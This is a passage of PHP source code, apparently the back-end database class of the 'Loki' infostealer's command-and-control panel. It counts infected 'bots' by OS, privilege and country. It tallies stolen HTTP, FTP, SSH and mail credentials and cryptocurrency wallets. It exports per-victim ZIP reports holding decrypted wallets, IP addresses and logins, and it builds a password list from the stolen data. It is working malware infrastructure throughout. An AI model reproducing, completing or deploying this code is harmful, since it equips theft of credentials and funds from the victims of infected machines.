				$this->Error_('Execute failed!', __FUNCTION__);
				return FALSE;
			}
			return TRUE;
		}

		function GetUsers()
		{
			$Result = array();
			$Query = "SELECT user_id, username, settings FROM ".$this->GetTableName(LOKI_USER_TABLE);

			if (!($STMT = $this->DBHandle->prepare($Query)))
			{
				$this->Error_('Prepare failed!', __FUNCTION__);
				return FALSE;
			}

			$STMT->bind_result($UserID, $Username, $Settings);

			if (!$STMT->execute())
			{
				$this->Error_('Execute failed!', __FUNCTION__);
				return FALSE;
			}
			$STMT->store_result();
			if($STMT->num_rows > 0)
			{
				while($STMT->fetch())
				{
					$Result[] = array("user_id" => $UserID, "username" => $Username, "settings" => $Settings);
				}
			}

			$STMT->free_result();
			$STMT->close();

			return $Result;
		}

		// CHART
		function GetOSData() //FIXME
		{
			$Results = array();

			$Query =
				'
				SELECT
				SUM(CASE WHEN `report_is_win64` = \'0\' THEN 1 ELSE 0 END) AS Bit32,
				SUM(CASE WHEN `report_is_win64` = \'1\' THEN 1 ELSE 0 END) AS Bit64,
				SUM(CASE WHEN `report_account` = \'0\' OR `report_account` = \'1\' THEN 1 ELSE 0 END) AS User,
				SUM(CASE WHEN `report_account` = \'2\' OR `report_account` = \'3\' THEN 1 ELSE 0 END) AS Admin,
				SUM(CASE WHEN `report_account` = \'1\' OR `report_account` = \'3\' THEN 1 ELSE 0 END) AS Elevated
				FROM '.$this->GetTableName(LOKI_REPORT_TABLE);

			if ((!$Result = $this->DBQuery($Query)))
				return NULL;

			while ($MyRow = $Result->fetch_array(MYSQLI_ASSOC))
				$Results[] = $MyRow;

			if ((!$Result2 = $this->DBQuery('SELECT report_os, COUNT(*) as Count_ FROM '.$this->GetTableName(LOKI_REPORT_TABLE).' GROUP BY report_os ORDER BY Count_ DESC')))
				return NULL;

			while ($MyRow = $Result2->fetch_array(MYSQLI_ASSOC))
				$Results['OS_DATA'][] = $MyRow;
			
			return $Results;
		}
		
		function GetOSDataBot() //FIXME
		{
			$Results = array();

			$Query =
				'
				SELECT
				SUM(CASE WHEN `bot_is_win64` = \'0\' THEN 1 ELSE 0 END) AS Bit32,
				SUM(CASE WHEN `bot_is_win64` = \'1\' THEN 1 ELSE 0 END) AS Bit64,
				SUM(CASE WHEN `bot_account` = \'0\' OR `bot_account` = \'1\' THEN 1 ELSE 0 END) AS User,
				SUM(CASE WHEN `bot_account` = \'2\' OR `bot_account` = \'3\' THEN 1 ELSE 0 END) AS Admin,
				SUM(CASE WHEN `bot_account` = \'1\' OR `bot_account` = \'3\' THEN 1 ELSE 0 END) AS Elevated
				FROM '.$this->GetTableName(LOKI_BOTS_TABLE);

			if ((!$Result = $this->DBQuery($Query)))
				return NULL;

			while ($MyRow = $Result->fetch_array(MYSQLI_ASSOC))
				$Results[] = $MyRow;

			if ((!$Result2 = $this->DBQuery('SELECT bot_os, COUNT(*) as Count_ FROM '.$this->GetTableName(LOKI_BOTS_TABLE).' GROUP BY bot_os ORDER BY Count_ DESC')))
				return NULL;

			while ($MyRow = $Result2->fetch_array(MYSQLI_ASSOC))
				$Results['OS_DATA'][] = $MyRow;
			
			return $Results;
		}
		
		function GetCountryData($Limit = 10, $RowCnt = "report_id", $RowBy = "report_country", $Table = 0)
		{
			$Tables = $this->GetTableName(LOKI_REPORT_TABLE);

			if($Table != 0)
				$Tables = $this->GetTableName(LOKI_BOTS_TABLE);
			
			$Result = array();
			$Query = "SELECT ".$RowBy.", COUNT(".$RowCnt.") as Count_ FROM ".$Tables." GROUP BY ".$RowBy." ORDER BY Count_ DESC LIMIT " . $this->EscapeString(intval($Limit));

			if (!($STMT = $this->DBHandle->prepare($Query)))
				return FALSE;
			
			$STMT->bind_result($Country, $Count);

			if (!$STMT->execute())
				return FALSE;
			
			$STMT->store_result();
			if($STMT->num_rows > 0)
			{
				while($STMT->fetch())
					$Result[] = array("".$RowBy."" => $Country, "Count_" => $Count);
			}

			$STMT->free_result();
			$STMT->close();

			return $Result;
		}
		
		function GetClientData($Limit = 10)
		{
			$Result = array();
			$Query = "SELECT data_client, COUNT(data_id) as Count_ FROM ".$this->GetTableName(LOKI_DATA_TABLE)." WHERE data_type != 'error' GROUP BY data_client ORDER BY Count_ DESC LIMIT " . $this->EscapeString(intval($Limit));

			if (!($STMT = $this->DBHandle->prepare($Query)))
			{
				$this->Error_('Prepare failed!', __FUNCTION__);
				return FALSE;
			}

			$STMT->bind_result($Client, $Count);

			if (!$STMT->execute())
			{
				$this->Error_('Execute failed!', __FUNCTION__);
				return FALSE;
			}
			$STMT->store_result();
			if($STMT->num_rows > 0)
			{
				while($STMT->fetch())
				{
					$Result[] = array("data_client" => $Client, "Count_" => $Count);
				}
			}

			$STMT->free_result();
			$STMT->close();

			return $Result;
		}
		
		function GetClientWallet($Limit = 10)
		{
			$Result = array();
			$Query = "SELECT wallet_client, COUNT(wallet_id) as Count_ FROM ".$this->GetTableName(LOKI_WALLETS_TABLE)." GROUP BY wallet_client ORDER BY Count_ DESC LIMIT " . $this->EscapeString(intval($Limit));

			if (!($STMT = $this->DBHandle->prepare($Query)))
			{
				$this->Error_('Prepare failed!', __FUNCTION__);
				return FALSE;
			}

			$STMT->bind_result($Client, $Count);

			if (!$STMT->execute())
			{
				$this->Error_('Execute failed!', __FUNCTION__);
				return FALSE;
			}
			$STMT->store_result();
			if($STMT->num_rows > 0)
			{
				while($STMT->fetch())
				{
					$Result[] = array("wallet_client" => $Client, "Count_" => $Count);
				}
			}

			$STMT->free_result();
			$STMT->close();

			return $Result;
		}
		function CountData($Type = NULL, $Time = NULL)
		{
			$Results = 0;
			$Query = "SELECT COUNT(data_id) FROM ".$this->GetTableName(LOKI_DATA_TABLE);

			if($Time != NULL)
				$Query .= " WHERE ? < report_time";

			if($Type != NULL)
			{
				if($Time != NULL)
					$Query .= " AND ";
				else
					$Query .= " WHERE ";

				if($Type == "http")
					$Query .= " data_type = 'http'";
				else if($Type == "ftp")
					$Query .= " data_type = 'ssh' OR data_type = 'ftp'";
				else if($Type == "data")
					$Query .= " data_type = 'mail' OR data_type = 'data' OR data_type = 'datadl'";
				else if($Type == "dump")
					$Query .= " data_type = 'dump'";
				else if($Type == "error")
					$Query .= " data_type = 'error'";
			}

			if (!($STMT = $this->DBHandle->prepare($Query)))
			{
				$this->Error_('Prepare failed!', __FUNCTION__);
				return FALSE;
			}

			if($Time != NULL)
			{
				$Time = $this->EscapeString(intval($Time));
				if (!($STMT->bind_param('i', $Time)))
				{
					$this->Error_('Bind failed!', __FUNCTION__);
					return FALSE;
				}        
			}

			$STMT->bind_result($Result);

			if (!$STMT->execute())
			{
				$this->Error_('Execute failed!', __FUNCTION__);
				return FALSE;
			}
			$STMT->store_result();
			if($STMT->num_rows > 0)
			{
				if (!$STMT->fetch())
					$this->Error_(__FUNCTION__. "() Fetch failed: (" . $STMT->errno . ") " . $STMT->error);
			}

			$STMT->free_result();
			$STMT->close();

			return $Result;
		}
		
		function CountWallet($Time = NULL)
		{
			$Results = 0;
			$Query = "SELECT COUNT(wallet_id) FROM ".$this->GetTableName(LOKI_WALLETS_TABLE);

			if($Time != NULL)
				$Query .= " WHERE ? < wallet_time";

			if (!($STMT = $this->DBHandle->prepare($Query)))
			{
				$this->Error_('Prepare failed!', __FUNCTION__);
				return FALSE;
			}

			if($Time != NULL)
			{
				$Time = $this->EscapeString(intval($Time));
				if (!($STMT->bind_param('i', $Time)))
				{
					$this->Error_('Bind failed!', __FUNCTION__);
					return FALSE;
				}        
			}

			$STMT->bind_result($Result);

			if (!$STMT->execute())
			{
				$this->Error_('Execute failed!', __FUNCTION__);
				return FALSE;
			}
			$STMT->store_result();
			if($STMT->num_rows > 0)
			{
				if (!$STMT->fetch())
					$this->Error_(__FUNCTION__. "() Fetch failed: (" . $STMT->errno . ") " . $STMT->error);
			}

			$STMT->free_result();
			$STMT->close();

			return $Result;
		}

		function CountReportsByTime($Time = NULL)
		{
			$Result = 0;
			$Query = "SELECT COUNT(report_id) FROM `".$this->GetTableName(LOKI_REPORT_TABLE)."`";

			if($Time != NULL)
				$Query .= " WHERE ? < report_time";


			if (!($STMT = $this->DBHandle->prepare($Query)))
			{
				$this->Error_('Prepare failed!', __FUNCTION__);
				return FALSE;
			}

			if($Time != NULL)
			{
				$Time = $this->EscapeString(intval($Time));
				if (!($STMT->bind_param('i', $Time)))
				{
					$this->Error_('Bind failed!', __FUNCTION__);
					return FALSE;
				}        
			}

			$STMT->bind_result($Result);

			if (!$STMT->execute())
			{
				$this->Error_('Execute failed!', __FUNCTION__);
				return FALSE;
			}
			$STMT->store_result();
			if($STMT->num_rows > 0)
			{
				if (!$STMT->fetch())
					$this->Error_(__FUNCTION__. "() Fetch failed: (" . $STMT->errno . ") " . $STMT->error);
			}

			$STMT->free_result();
			$STMT->close();

			return $Result;
		}

		function CountBotsByTime($Time = NULL, $NewBots = FALSE)
		{
			$Result = 0;
			$Query = "SELECT COUNT(bot_id) FROM `".$this->GetTableName(LOKI_BOTS_TABLE)."`";

			$Rows = "< bot_last_online";
			if($NewBots)
				$Rows = "< bot_first_online";
			
			if($Time != NULL)
				$Query .= " WHERE ? " . $Rows;


			if (!($STMT = $this->DBHandle->prepare($Query)))
			{
				$this->Error_('Prepare failed!', __FUNCTION__);
				return FALSE;
			}

			if($Time != NULL)
			{
				$Time = $this->EscapeString(intval($Time));
				if (!($STMT->bind_param('i', $Time)))
				{
					$this->Error_('Bind failed!', __FUNCTION__);
					return FALSE;
				}        
			}

			$STMT->bind_result($Result);

			if (!$STMT->execute())
			{
				$this->Error_('Execute failed!', __FUNCTION__);
				return FALSE;
			}
			$STMT->store_result();
			if($STMT->num_rows > 0)
			{
				if (!$STMT->fetch())
					$this->Error_(__FUNCTION__. "() Fetch failed: (" . $STMT->errno . ") " . $STMT->error);
			}

			$STMT->free_result();
			$STMT->close();

			return $Result;
		}
		
		function CountDataByTime($Where = '1 = 1', $Time)
		{
			$Query = '
					 SELECT HOUR(FROM_UNIXTIME(data_time, \'%Y-%m-%d %H:%i:%s\')) as time_, COUNT(*) as count_
					 FROM '.$this->GetTableName(LOKI_DATA_TABLE).'
					 WHERE ('.$Where.') AND data_time >= '.$Time.' GROUP BY HOUR(FROM_UNIXTIME(data_time, \'%Y-%m-%d %H:%i:%s\'))';

			if ((!$Result = $this->DBQuery($Query)))
				return NULL;

			$Results = array();
			while ($MyRow = $Result->fetch_array(MYSQLI_ASSOC))
				$Results[intval($MyRow['time_'])] = $MyRow['count_'];

			return $Results;
		}
		
		function CountWalletByTime($Time)
		{
			$Query = '
					 SELECT HOUR(FROM_UNIXTIME(wallet_time, \'%Y-%m-%d %H:%i:%s\')) as time_, COUNT(*) as count_
					 FROM '.$this->GetTableName(LOKI_WALLETS_TABLE).'
					 WHERE  wallet_time >= '.$Time.' GROUP BY HOUR(FROM_UNIXTIME(wallet_time, \'%Y-%m-%d %H:%i:%s\'))';

			if ((!$Result = $this->DBQuery($Query)))
				return NULL;

			$Results = array();
			while ($MyRow = $Result->fetch_array(MYSQLI_ASSOC))
				$Results[intval($MyRow['time_'])] = $MyRow['count_'];

			return $Results;
		}	
		
		function CountDataToDateByHour($Type, $Time)
		{
			if($Type == "http")
				return $this->CountDataByTime('data_type=\'http\'', $Time);
			else if($Type == "ftp")
				return $this->CountDataByTime('data_type=\'ftp\' OR data_type=\'ssh\'', $Time);
			else if($Type == "data")
				return $this->CountDataByTime('data_type=\'mail\' OR data_type=\'data\' OR data_type=\'datadl\'', $Time);
			else if($Type == "dump")
				return $this->CountDataByTime('data_type=\'dump\'', $Time);
			return NULL;
		}

		function GetReports_Last24h()
		{
			$Query = '
					 SELECT HOUR(FROM_UNIXTIME(report_time, \'%Y-%m-%d %H:%i:%s\')) as time_, COUNT(*) as count_
					 FROM '.$this->GetTableName(LOKI_REPORT_TABLE).'
					 WHERE report_time >= '.LastHour(24).'
					 GROUP BY HOUR(FROM_UNIXTIME(report_time, \'%Y-%m-%d %H:%i:%s\'))';

			if ((!$Result = $this->DBQuery($Query)))
				return NULL;

			$Results = array();
			while ($MyRow = $Result->fetch_array(MYSQLI_ASSOC))
				$Results[intval($MyRow['time_'])] = $MyRow['count_'];

			return $Results;
		}

		// CHART

		function ExportReport_($ID_, $Mark = FALSE)
		{
			$TMPDir = GetTMPDir();
			$TMPName = tempnam($TMPDir, 'zip');
			$ZIP_ = NewZipFile($TMPName);
			if($ZIP_)
			{
				$ReportDATA = $this->GetAllDataByID($ID_);
				$PWFile = '';
				
				$StrLen = strlen('Architecture: ');
				$LineLen = strlen(str_pad('Report hash: ', $StrLen)) + 32;
				
				$PWFile .= str_pad('', $LineLen, '-') . "\r\n";
				$PWFile .= str_pad('Time: ', $StrLen) . NowDate(NULL, $ReportDATA['REPORT'][0]['report_time']) . "\r\n";
				$PWFile .= str_pad('GUID: ', $StrLen) . $ReportDATA['REPORT'][0]['report_guid'] . "\r\n";
				$PWFile .= str_pad('OS: ', $StrLen) . GetOSText($ReportDATA['REPORT'][0]['report_os']) . "\r\n";
				$PWFile .= str_pad('Architecture: ', $StrLen) . ($ReportDATA['REPORT'][0]['report_is_win64'] ? 'x64' : 'x32') . "\r\n";
				$PWFile .= str_pad('Screen Size: ', $StrLen) . $ReportDATA['REPORT'][0]['report_screen'] . "\r\n";
				$PWFile .= str_pad('Name: ', $StrLen) . stripslashes ($ReportDATA['REPORT'][0]['report_name']) . "\r\n";
				$PWFile .= str_pad('Account Type: ', $StrLen) . GetAccountText($ReportDATA['REPORT'][0]['report_account']) . "\r\n";
				$PWFile .= str_pad('Elevated: ', $StrLen) . (AccountElevated($ReportDATA['REPORT'][0]['report_account']) ? 'Yes' : 'No') . "\r\n";
				$PWFile .= str_pad('IP Address: ', $StrLen) . $ReportDATA['REPORT'][0]['report_ip'] . "\r\n";
				$PWFile .= str_pad('Country: ', $StrLen) . GetCountryName($ReportDATA['REPORT'][0]['report_country']) . ' (' . $ReportDATA['REPORT'][0]['report_country'] . ')' . "\r\n";
				$PWFile .= str_pad('Report hash: ', $StrLen) . $ReportDATA['REPORT'][0]['report_hash'] . "\r\n";
				$PWFile .= str_pad('Total Data: ', $StrLen) . ($ReportDATA['DATA']["NumOfData"] + $ReportDATA['WALLET']["NumOfData"]) . "\r\n";
			
				$PWFile .= str_pad('', $LineLen, '-') . "\r\n\r\n";
				$DataDL = NULL;
				
				foreach($ReportDATA['DATA'] as $Elements)
				{
					if(isset($Elements["data_text"]))
					{
						if($Elements['data_type'] == 'datadl')
							$DataDL[] = $Elements;
						else if($Elements['data_type'] == 'mail')
						{
							$JSON_ = json_decode(stripslashes ($Elements["data_text"]), TRUE);
							
							if(strlen($JSON_['PR']))
								$PWFile .= $JSON_['PR'] . "://";
							
							$PWFile .= $JSON_['EM'] . "|";
							
							if(strlen($JSON_['SE']))
							{
								$PWFile .= $JSON_['SE'];
								if(strlen($JSON_['PO']))
									$PWFile .= ":" . $JSON_['PO'];
								
								$PWFile .= "|";
							}
								
							$PWFile .= $JSON_['US'] . "|" . $JSON_['PW'] . "\r\n";
							$JSON__ = NULL;
						}
						else
						{
							$DataClient___ = '';
							if($Mark)
								$DataClient___ = " (" . GetClient($Elements['data_client']) . ")";
							$PWFile .= $Elements["data_text"] . $DataClient___ . "\r\n";
						}
								
					}
				}
			
				AddBufferToZip($ZIP_, "REPORT_" . $ReportDATA['REPORT'][0]['report_hash'] . /*"_" . NowDate("Ymd_His") . */ ".txt", $PWFile);
				
				if($DataDL != NULL && isset($DataDL[0]))
				{
					if(AddFolderToZip($ZIP_, "Downloads"))
					{
						foreach($DataDL as $Elements)
						{
							if(isset($Elements["data_text"]))
							{
								/*$Data = explode("|", $Elements["data_text"]);
								AddBufferToZip($ZIP_, "Downloads\\". $Data[0], hex2bin ($Data[1]));
								$Data = NULL;*/
								
								$File___ = $TMPDir . '/' . $Elements["data_text"];
								if(file_exists($File___))
								{
									$Buffer = DecryptWallet(file_get_contents($File___), ENCKEY_);
									AddBufferToZip($ZIP_, "Downloads\\". $Elements["data_text"], $Buffer );
									$Buffer  = NULL;
								}

							
							}
						}
					}
					else
					{
						die();
					}
					
					$DataDL = NULL;
				}
				
				if(isset($ReportDATA['WALLET']["NumOfData"]) && $ReportDATA['WALLET']["NumOfData"] > 0)
				{
					if(AddFolderToZip($ZIP_, "Wallets"))
					{
						foreach($ReportDATA['WALLET'] as $Elements)
						{
							if(isset($Elements["wallet_name"]))
							{
								$File = $TMPDir . '/' . trim($Elements["wallet_name"]);
								if(file_exists($File))
								{
									$Buffer = DecryptWallet(file_get_contents($File), ENCKEY_);
									AddBufferToZip($ZIP_, "Wallets\\" . trim($Elements["wallet_name"]), $Buffer);
									$Buffer = NULL;
								}
							}
						}
					}
									else
					{
						die();
					}
				}
				
				
				SaveZip($ZIP_);
						
				$Buffer = file_get_contents($TMPName);
				unlink($TMPName);
				
				SetDownloadHeader("REPORT_" . $ReportDATA['REPORT'][0]['report_hash'] . /*"_" . NowDate("Ymd_His") . */ ".zip");
				$ReportDATA = NULL;
				echo $Buffer;
			}
		}
		
		function ExportPW_($ID_ = NULL)
		{
				$ReportDATA = $this->GetData(NULL, NULL, NULL, NULL, NULL, NULL, $ID_);
				$PWFile = NULL;
				
				foreach($ReportDATA as $Elements)
				{
					if(isset($Elements["data_text"]))
					{
						if($Elements['data_type'] != 'datadl')
						{
							if($Elements['data_type'] == 'mail')
							{
								$JSON_ = json_decode(stripslashes ($Elements["data_text"]), TRUE);
								$PW_ = $JSON_['PW'];
								if(strlen($PW_))
								{
									$PWFile[] = $PW_;
								}
								
								$JSON_ = NULL;
							}
							else
							{
								$PW_ = trim(parse_url($Elements["data_text"], PHP_URL_PASS));
								if(strlen($PW_))
								{
									$PWFile[] = $PW_;
								}
								
								$PW_ = trim(parse_url($Elements["data_text"], PHP_URL_USER));
								if(strlen($PW_))
								{
									if(isValidEmail($PW_))
									{
										$Part = explode("@", $PW_);
										$PWFile[] = $Part[0];
									}
									else
										$PWFile[] = $PW_;
								}
							}

						}
					}
				}

				$PWFile = array_unique($PWFile);
				
				SetDownloadHeader("PWList.txt");
				echo implode("\r\n", $PWFile);
				
			exit;
		}
	}
